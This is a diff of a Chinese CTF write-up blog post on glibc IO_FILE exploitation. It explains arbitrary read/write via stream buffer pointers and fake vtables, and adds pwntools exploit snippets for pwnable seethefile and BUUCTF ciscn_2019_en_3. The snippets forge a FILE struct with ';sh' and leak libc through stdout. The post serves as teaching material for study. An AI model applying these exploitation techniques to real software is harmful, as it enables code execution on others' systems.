@@ -50,11 +50,11 @@
 <link rel="shortcut icon" href="../../../../images/favicon.png">
 
 
-<title>Watch Security</title>
+<title>pwn_with_io_file - Watch Security</title>
 
 <meta name="keywords" content="pwn io file">
 
-<meta name="description " content="">
+<meta name="description " content="pwn IO">
 
 </head>
 <body>
@@ -175,9 +175,9 @@
                 </p>
                 <p></p>
             </div>
-            <h2 class="post-title"></h2>
+            <h2 class="post-title">Pwn_with_IO_FILE</h2>
             <div class="post-meta">
-                本文总共9760个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+                本文总共11308个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
             </div>
         </div>
         <div class="post-content markdown-body">
@@ -224,12 +224,12 @@
 </ul>
 </li>
 <li><h5 id="高级利用方式（任意地址读、写）"><a href="#高级利用方式（任意地址读、写）" class="headerlink" title="高级利用方式（任意地址读、写）"></a>高级利用方式（任意地址读、写）</h5><ul>
-<li>由于gblic的改进，很多对vtable的攻击方式不再适用，换个思路。不再只看向vtable，而是转向stream_buffer。</li>
+<li>由于gblic的更新，很多对vtable的攻击方式不再适用，换个思路。不再只看向vtable，而是转向stream_buffer。</li>
 <li>通过控制_fileno，read_ptr、等等指针我们可以实现任意地址读和任意地址写操作。</li>
 </ul>
 </li>
 <li><h5 id="利用fwrite进行任意地址读"><a href="#利用fwrite进行任意地址读" class="headerlink" title="利用fwrite进行任意地址读"></a>利用fwrite进行任意地址读</h5><ul>
-<li><p>对目的fp的设置，以及绕过</p>
+<li><p>对目的fp的设置，以及绕过。</p>
 <ul>
 <li>设置_fileno为stdout，泄露信息到stdout。</li>
 <li>设置_flags &amp; ~ IO_NO_WRITE</li>
@@ -271,27 +271,30 @@
 <li><p>相关的检查代码</p>
 <ul>
 <li><p>read_ptr = read_base = null。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (want &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">    	</span><br><span class="line">   	<span class="comment">//缓冲区的内容已经足够，直接memcpy过去。</span></span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">	  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">	  want = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    ........................</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	  <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">	     the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">	     the user buffer. */</span></span><br><span class="line">	  <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">	      &amp;&amp; want &lt; (<span class="keyword">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">continue</span>;</span><br><span class="line">	    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (want &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">    	</span><br><span class="line">   	<span class="comment">//缓冲区的内容已经足够，直接memcpy过去。</span></span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">	  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">	  want = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    ........................</span><br><span class="line">&#125;</span><br><span class="line">	  <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">	     the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">	     the user buffer. */</span></span><br><span class="line">	  <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">	      &amp;&amp; want &lt; (<span class="keyword">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">continue</span>;</span><br><span class="line">	    &#125;</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 </li>
+</ul>
+</li>
+</ul>
+<ul>
 <li><h6 id="样例-1"><a href="#样例-1" class="headerlink" title="样例"></a>样例</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FILE* fp;</span><br><span class="line">	<span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">	<span class="keyword">char</span> msg[<span class="number">100</span>];</span><br><span class="line">	fp = fopen(<span class="string">"key.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">	fp-&gt;_flags &amp;= ~<span class="number">4</span>;</span><br><span class="line">	fp-&gt;_IO_buf_base = msg;</span><br><span class="line">	fp-&gt;_IO_buf_end = msg+<span class="number">100</span>;</span><br><span class="line">	fp-&gt;_fileno = <span class="number">0</span>;</span><br><span class="line">	fread(buf,<span class="number">1</span>,<span class="number">6</span>,fp);			<span class="comment">//read to msg</span></span><br><span class="line">	<span class="built_in">puts</span>(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>结果，我们会发现输入的内容存于msg中。</p>
-
-</li>
-</ul>
+<img src="/2019/09/21/Pwn-with-IO-FILE/11.png" title="[]">
 </li>
 <li><p>当程序中不存在任何的文件操作时，要知道我们一直用的标准输入输出函数也可以利用。</p>
 <ul>
 <li>scanf/printf/gets/puts；这些函数最终会调用底层的read和write函数。</li>
-<li>他们的文件描述符时stdin、stdout。</li>
-</ul>
+<li><p>他们的文件描述符时stdin、stdout。</p>
 </li>
 <li><p>覆写缓冲区指针，仍可以任意地址写、读。</p>
 </li>
 </ul>
-<h4 id="2018-HCTF-the-end"><a href="#2018-HCTF-the-end" class="headerlink" title="2018 HCTF the_end"></a>2018 HCTF the_end</h4><ul>
-<li><ul>
+</li>
+</ul>
+<ul>
+<li><h5 id="2018-HCTF-the-end"><a href="#2018-HCTF-the-end" class="headerlink" title="2018 HCTF the_end"></a>2018 HCTF the_end</h5><ul>
 <li><p>漏洞分析，存在一个任意地址写漏洞，可以5次，每次1byte。</p>
 <img src="/2019/09/21/Pwn-with-IO-FILE/6.png" title="[]">
 </li>
@@ -331,7 +334,7 @@
 </ul>
 <ul>
 <li><h5 id="pwntable的seethefile"><a href="#pwntable的seethefile" class="headerlink" title="pwntable的seethefile"></a>pwntable的seethefile</h5><ul>
-<li><p>漏洞分析，name字段scanf存在溢出，可以覆盖fd，伪造一个FILE结构。可以利用flush或者close达到任意代码执行的目的。</p>
+<li><p>漏洞分析，name字段scanf存在溢出，可以覆盖fd，<strong>伪造一个FILE结构</strong>。可以利用flush或者close达到任意代码执行的目的。</p>
 <img src="/2019/09/21/Pwn-with-IO-FILE/8.png" title="[]">
 </li>
 <li><p>利用过程</p>
@@ -346,16 +349,65 @@
 </li>
 <li><p>伪造vtable，设置flush字段为system</p>
 </li>
+<li><p>exp记录</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">name += p32(fake_file_addr)		<span class="comment">#*fd = fake_file_addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#padding</span></span><br><span class="line">fake_file = <span class="string">"\x00"</span> * (fake_file_addr - fd_addr <span class="number">-4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#file struct</span></span><br><span class="line">fake_file += ((p32(<span class="number">0xffffdfff</span>) + <span class="string">";sh"</span>).ljust(<span class="number">0x94</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake vtable_addr</span></span><br><span class="line">fake_file += p32(fake_file_addr + <span class="number">0x98</span>)	</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake_vtables		</span></span><br><span class="line">fake_file += p32(system_addr)*<span class="number">21</span></span><br><span class="line">exit(name + fake_file)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li><p><a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">BUUCTF ciscn_2019_en_3</a></p>
+<ul>
+<li><p>这是个ubuntu18下面的堆利用。（前面记录过的Tcache机制）</p>
+<ul>
+<li><p>漏洞分析，程序只提供了add和delete功能（edit和show是无效的）。其中add操作虽然没有溢出，但却是对输入无截断的。</p>
+<img src="/2019/09/21/Pwn-with-IO-FILE/12.png" title="[]">
+</li>
+<li><p>漏洞在delete下，存在double free（dup）</p>
+<img src="/2019/09/21/Pwn-with-IO-FILE/11.png" title="[]">
+</li>
 </ul>
 </li>
-<li><p>exp记录</p>
-<pre><code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fd_addr = <span class="number">0x0804B280</span></span><br><span class="line">  fake_file_addr = <span class="number">0x0804B300</span></span><br><span class="line">  </span><br><span class="line">  name = <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">  name += p32(fake_file_addr)		<span class="comment">#*fd = fake_file_addr</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">#padding</span></span><br><span class="line">  fake_file = <span class="string">"\x00"</span> * (fake_file_addr - fd_addr <span class="number">-4</span>)</span><br><span class="line">  </span><br><span class="line">  <span class="comment">#file struct</span></span><br><span class="line">  fake_file += ((p32(<span class="number">0xffffdfff</span>) + <span class="string">";sh"</span>).ljust(<span class="number">0x94</span>, <span class="string">'\x00'</span>))</span><br><span class="line">  </span><br><span class="line">  <span class="comment">#fake vtable_addr</span></span><br><span class="line">  fake_file += p32(fake_file_addr + <span class="number">0x98</span>)	</span><br><span class="line">  </span><br><span class="line">  <span class="comment">#fake_vtables		</span></span><br><span class="line">  fake_file += p32(system_addr)*<span class="number">21</span></span><br><span class="line">  exit(name + fake_file)</span><br></pre></td></tr></table></figure>
-</code></pre></li>
+<li><p>利用思路</p>
+<ul>
+<li>这题最重要在于如何泄露libc地址。由于没有可以正常输出chunk内容的方式，一般向这种直接没办法正常输出的，就是需要IO登场了。</li>
+<li>输出，自然是s在stdout上做文章。</li>
+<li>最终，我们只需要改写_IO_write_base，指向一个地址，该地址可以泄露出__IO_file_jumps地址。</li>
 </ul>
-<pre><code>```
-</code></pre><h4 id="学习链接"><a href="#学习链接" class="headerlink" title="学习链接"></a>学习链接</h4><ul>
+</li>
+<li><p>利用过程（exp详解）</p>
+<ul>
+<li><p>利用unsorted bin和tcache重叠（错位）的过程中，写入tcache第一个chunk的fd指向main_arena。和stdout相差就是偏移的差别，完全可以爆破。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">prepare()</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'0000'</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'1111'</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'2222'</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'3333'</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'4444'</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'5555'</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'6666'</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'7777'</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'8888'</span>)			<span class="comment">#avoid consilate with top chunk</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">#fill the tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	delete(i)</span><br><span class="line"></span><br><span class="line">gdb.attach(p, <span class="string">'b printf'</span>)</span><br><span class="line">dbg()</span><br><span class="line"><span class="comment">#free into unsorted bin</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"><span class="comment">#double free 6, 5 which is near to idx7, into unsorted bin,</span></span><br><span class="line">delete(<span class="number">6</span>)				</span><br><span class="line">delete(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
+<p>此时，unsorted bin和tcache已经存存在重叠。</p>
+<img src="/2019/09/21/Pwn-with-IO-FILE/13.png" title="[]">
+</li>
+<li><p>再请求chunk，这一次使得我们可以写入tcache的fd指针。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0xa0</span>, <span class="string">'a'</span>*<span class="number">0x90</span> + <span class="string">'\x60\x87'</span>) <span class="comment">#idx8 from unsorted bin idx5\6,  overwrite 								#idx5's fd is stdout</span></span><br></pre></td></tr></table></figure>
+<p>可以看到，tcache的fd指针已经改写了；发现我们伪造的和stdout不一样，没关系，在调试的时候，可以手动改一下。<strong>set {unsigned int}addr=value</strong></p>
+<img src="/2019/09/21/Pwn-with-IO-FILE/14.png" title="[]">
+<img src="/2019/09/21/Pwn-with-IO-FILE/15.png" title="[]">
+</li>
+<li><p>分配两次两次，可以得到stdout的chunk。</p>
+</li>
+<li><p>我们先看一看stdout的结构。</p>
+<img src="/2019/09/21/Pwn-with-IO-FILE/16.png" title="[]">
+<p>注意，上面标注的1的位置就是_IO_write_base，2是__IO_file_jumps的位置。换句话说，我们把1低位覆盖为0，就可以泄露libc地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get a chunk from points to stdout</span></span><br><span class="line">add(<span class="number">0x80</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span>)	<span class="comment">#idx10 change _flags, _IO_write_base					</span></span><br><span class="line">      </span><br><span class="line">data = p.recv(<span class="number">0x60</span>)</span><br><span class="line">leak = u64(data[<span class="number">0x58</span>:])									<span class="comment">#io_file jump</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak ==&gt; "</span> + hex(leak)</span><br></pre></td></tr></table></figure>
+<p>_flags和其他检查的绕过根据上面提到的<strong>利用fwrite</strong>任意读来构造。</p>
+<p>已经可以拿到了libc地址。</p>
+<img src="/2019/09/21/Pwn-with-IO-FILE/17.png" title="[]">
+</li>
+<li><p>其他的就是和double dup一样的操作拿到shell。这里有个坑就是，不可以继续add和tcache存有同样大小的chunk，因为我们改过fd导致后面的chunk都是不合法的，会触发异常。具体地，调试的时候注意调整。</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="学习链接"><a href="#学习链接" class="headerlink" title="学习链接"></a>学习链接</h4><ul>
 <li><a href="https://www.jianshu.com/p/a6354fa4dbdf" target="_blank" rel="noopener">IO_FILE通用利用模板</a></li>
-<li></li>
+<li><a href="https://www.slideshare.net/AngelBoy1/" target="_blank" rel="noopener">AngleBoy关于IO_FILE的Slide</a></li>
 </ul>
 
         </div>
